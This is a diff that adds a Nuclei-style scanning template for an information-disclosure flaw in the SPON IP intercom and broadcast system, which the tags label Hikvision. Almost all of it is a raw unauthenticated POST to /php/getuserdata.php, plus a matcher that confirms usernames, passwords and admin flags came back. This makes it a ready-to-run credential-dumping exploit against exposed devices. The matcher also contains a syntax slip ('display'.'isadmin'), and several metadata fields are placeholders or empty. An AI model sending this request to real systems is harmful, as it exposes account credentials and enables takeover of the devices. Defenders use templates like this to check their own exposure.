@@ -1,0 +1,38 @@
+id: hikvision-spon-group-intercom-getuserdata-disclosure
+info:
+  name: SPON IP网络对讲广播系统php/getuserdata.php存在敏感信息漏洞
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://mp.weixin.qq.com/s/svV2yKLBWWE4stOo_vNnIg
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: hikvision,spon,disclosure
+
+http:
+  - raw:
+      - |
+        POST /php/getuserdata.php HTTP/1.1
+        User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Host: {{Hostname}}
+        Content-Length: 44
+        Content-Type: application/x-www-form-urlencoded
+
+        jsondata[pageIndex]=0&jsondata[pageCount]=30
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'username','password','display'.'isadmin')
+        condition: and
